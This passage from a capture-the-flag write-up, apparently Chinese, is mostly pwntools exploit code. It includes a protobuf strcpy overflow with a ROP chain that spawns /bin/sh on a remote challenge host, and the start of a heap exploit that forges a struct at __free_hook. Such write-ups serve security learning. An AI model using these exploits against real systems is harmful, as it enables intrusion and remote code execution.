</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;a.charTo(</span><span class=si>{</span><span class=n>dis</span><span class=o>+</span><span class=n>i</span><span class=si>}</span><span class=s1>, </span><span class=si>{</span><span class=n>og</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=si>}</span><span class=s1>);&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=s1>&#39;b = [];&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=s1>&#39;b.push(&#34;winmt&#34;);&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2022-xyb-SU-Writeup/13.png alt=image></p><h2 id=protocol>protocol</h2><p>protobuf协议，存在一个strcpy造成栈溢出，通过strcpy末尾补0的性质多次刷0组合，避开00截断的问题。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Generated by the protocol buffer compiler.  DO NOT EDIT!</span>
</span></span><span class=line><span class=cl><span class=c1># source: ctf.proto</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=n>_b</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>version_info</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>&lt;</span><span class=mi>3</span> <span class=ow>and</span> <span class=p>(</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span><span class=n>x</span><span class=p>)</span> <span class=ow>or</span> <span class=p>(</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span><span class=n>x</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;latin1&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>google.protobuf</span> <span class=kn>import</span> <span class=n>descriptor</span> <span class=k>as</span> <span class=n>_descriptor</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>google.protobuf</span> <span class=kn>import</span> <span class=n>message</span> <span class=k>as</span> <span class=n>_message</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>google.protobuf</span> <span class=kn>import</span> <span class=n>reflection</span> <span class=k>as</span> <span class=n>_reflection</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>google.protobuf</span> <span class=kn>import</span> <span class=n>symbol_database</span> <span class=k>as</span> <span class=n>_symbol_database</span>
</span></span><span class=line><span class=cl><span class=c1># @@protoc_insertion_point(imports)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>_sym_db</span> <span class=o>=</span> <span class=n>_symbol_database</span><span class=o>.</span><span class=n>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DESCRIPTOR</span> <span class=o>=</span> <span class=n>_descriptor</span><span class=o>.</span><span class=n>FileDescriptor</span><span class=p>(</span>
</span></span><span class=line><span class=cl>  <span class=n>name</span><span class=o>=</span><span class=s1>&#39;ctf.proto&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>package</span><span class=o>=</span><span class=s1>&#39;ctf&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>syntax</span><span class=o>=</span><span class=s1>&#39;proto2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>serialized_options</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>serialized_pb</span><span class=o>=</span><span class=n>_b</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n\t</span><span class=s1>ctf.proto</span><span class=se>\x12\x03\x63</span><span class=s1>tf</span><span class=se>\&#34;</span><span class=s1>)</span><span class=se>\n\x03</span><span class=s1>pwn</span><span class=se>\x12\x10\n\x08</span><span class=s1>username</span><span class=se>\x18\x01</span><span class=s1> </span><span class=se>\x01</span><span class=s1>(</span><span class=se>\x0c\x12\x10\n\x08</span><span class=s1>password</span><span class=se>\x18\x02</span><span class=s1> </span><span class=se>\x01</span><span class=s1>(</span><span class=se>\x0c</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>_PWN</span> <span class=o>=</span> <span class=n>_descriptor</span><span class=o>.</span><span class=n>Descriptor</span><span class=p>(</span>
</span></span><span class=line><span class=cl>  <span class=n>name</span><span class=o>=</span><span class=s1>&#39;pwn&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>full_name</span><span class=o>=</span><span class=s1>&#39;ctf.pwn&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>filename</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>file</span><span class=o>=</span><span class=n>DESCRIPTOR</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>containing_type</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>fields</span><span class=o>=</span><span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=n>_descriptor</span><span class=o>.</span><span class=n>FieldDescriptor</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=n>name</span><span class=o>=</span><span class=s1>&#39;username&#39;</span><span class=p>,</span> <span class=n>full_name</span><span class=o>=</span><span class=s1>&#39;ctf.pwn.username&#39;</span><span class=p>,</span> <span class=n>index</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>number</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=mi>12</span><span class=p>,</span> <span class=n>cpp_type</span><span class=o>=</span><span class=mi>9</span><span class=p>,</span> <span class=n>label</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>has_default_value</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>default_value</span><span class=o>=</span><span class=n>_b</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>      <span class=n>message_type</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>enum_type</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>containing_type</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>is_extension</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>extension_scope</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>serialized_options</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>DESCRIPTOR</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>_descriptor</span><span class=o>.</span><span class=n>FieldDescriptor</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=n>name</span><span class=o>=</span><span class=s1>&#39;password&#39;</span><span class=p>,</span> <span class=n>full_name</span><span class=o>=</span><span class=s1>&#39;ctf.pwn.password&#39;</span><span class=p>,</span> <span class=n>index</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>number</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=mi>12</span><span class=p>,</span> <span class=n>cpp_type</span><span class=o>=</span><span class=mi>9</span><span class=p>,</span> <span class=n>label</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>has_default_value</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>default_value</span><span class=o>=</span><span class=n>_b</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>      <span class=n>message_type</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>enum_type</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>containing_type</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>is_extension</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>extension_scope</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>serialized_options</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>DESCRIPTOR</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=p>],</span>
</span></span><span class=line><span class=cl>  <span class=n>extensions</span><span class=o>=</span><span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>],</span>
</span></span><span class=line><span class=cl>  <span class=n>nested_types</span><span class=o>=</span><span class=p>[],</span>
</span></span><span class=line><span class=cl>  <span class=n>enum_types</span><span class=o>=</span><span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>],</span>
</span></span><span class=line><span class=cl>  <span class=n>serialized_options</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>is_extendable</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>syntax</span><span class=o>=</span><span class=s1>&#39;proto2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>extension_ranges</span><span class=o>=</span><span class=p>[],</span>
</span></span><span class=line><span class=cl>  <span class=n>oneofs</span><span class=o>=</span><span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>],</span>
</span></span><span class=line><span class=cl>  <span class=n>serialized_start</span><span class=o>=</span><span class=mi>18</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>serialized_end</span><span class=o>=</span><span class=mi>59</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DESCRIPTOR</span><span class=o>.</span><span class=n>message_types_by_name</span><span class=p>[</span><span class=s1>&#39;pwn&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>_PWN</span>
</span></span><span class=line><span class=cl><span class=n>_sym_db</span><span class=o>.</span><span class=n>RegisterFileDescriptor</span><span class=p>(</span><span class=n>DESCRIPTOR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pwn</span> <span class=o>=</span> <span class=n>_reflection</span><span class=o>.</span><span class=n>GeneratedProtocolMessageType</span><span class=p>(</span><span class=s1>&#39;pwn&#39;</span><span class=p>,</span> <span class=p>(</span><span class=n>_message</span><span class=o>.</span><span class=n>Message</span><span class=p>,),</span> <span class=nb>dict</span><span class=p>(</span>
</span></span><span class=line><span class=cl>  <span class=n>DESCRIPTOR</span> <span class=o>=</span> <span class=n>_PWN</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=vm>__module__</span> <span class=o>=</span> <span class=s1>&#39;ctf_pb2&#39;</span>
</span></span><span class=line><span class=cl>  <span class=c1># @@protoc_insertion_point(class_scope:ctf.pwn)</span>
</span></span><span class=line><span class=cl>  <span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>_sym_db</span><span class=o>.</span><span class=n>RegisterMessage</span><span class=p>(</span><span class=n>pwn</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># @@protoc_insertion_point(module_scope)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctf_pb2</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span> <span class=o>=</span> <span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#io = process(&#34;./protocol&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;101.201.71.136&#34;</span><span class=p>,</span> <span class=mi>38494</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>zero_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>ctf_pb2</span><span class=o>.</span><span class=n>pwn</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span><span class=o>.</span><span class=n>username</span> <span class=o>=</span> <span class=n>username</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span><span class=o>.</span><span class=n>password</span> <span class=o>=</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span><span class=o>.</span><span class=n>SerializeToString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rax_ret</span> <span class=o>=</span> <span class=mh>0x5bdb8a</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=mh>0x404982</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi_ret</span> <span class=o>=</span> <span class=mh>0x588bbe</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx_ret</span> <span class=o>=</span> <span class=mh>0x40454f</span>
</span></span><span class=line><span class=cl><span class=n>syscall_ret</span> <span class=o>=</span> <span class=mh>0x68f0a4</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=mh>0x81A380</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x148</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>59</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>zero_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>zero_list</span> <span class=o>=</span> <span class=n>zero_list</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>login</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;winmt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Login: &#34;</span><span class=p>,</span> <span class=n>login</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>zero_list</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=n>login</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;winmt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Login: &#34;</span><span class=p>,</span> <span class=n>login</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>login</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;admin&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Login: &#34;</span><span class=p>,</span> <span class=n>login</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=queue>queue</h2><p>队列结构体</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>struct elem
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  _QWORD buf_array_ptr;
</span></span><span class=line><span class=cl>  _QWORD sub_buf_max;
</span></span><span class=line><span class=cl>  _QWORD pBuffStart;
</span></span><span class=line><span class=cl>  _QWORD a3;
</span></span><span class=line><span class=cl>  _QWORD pBuffLast;
</span></span><span class=line><span class=cl>  char **sub_bufs;
</span></span><span class=line><span class=cl>  _QWORD pBuffEnd;
</span></span><span class=line><span class=cl>  _QWORD a7;
</span></span><span class=line><span class=cl>  _QWORD a8;
</span></span><span class=line><span class=cl>  _QWORD sub_buf_last;
</span></span><span class=line><span class=cl>};
</span></span></code></pre></td></tr></table></div></div><p>666功能可以直接修改结构体
伪造结构体再通过其他功能可以实现任意地址读写
首先需要泄露一个地址
覆盖pBuffStart, 爆破一个十六进制位到有堆地址的地方
泄露堆地址
然后申请几个再free填tcache, 在堆上制造libc地址
构造结构体pBuffStart指向含libc地址处
泄露libc地址
然后伪造结构体在__free_hook处
用程序edit单字节循环写入</p><p>exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>colorama</span> <span class=kn>import</span> <span class=n>Fore</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>colorama</span> <span class=kn>import</span> <span class=n>Style</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>inspect</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>argparse</span> <span class=kn>import</span> <span class=n>ArgumentParser</span>
</span></span><span class=line><span class=cl><span class=n>parser</span> <span class=o>=</span> <span class=n>ArgumentParser</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--elf&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;./queue&#34;</span><span class=p>)</span>
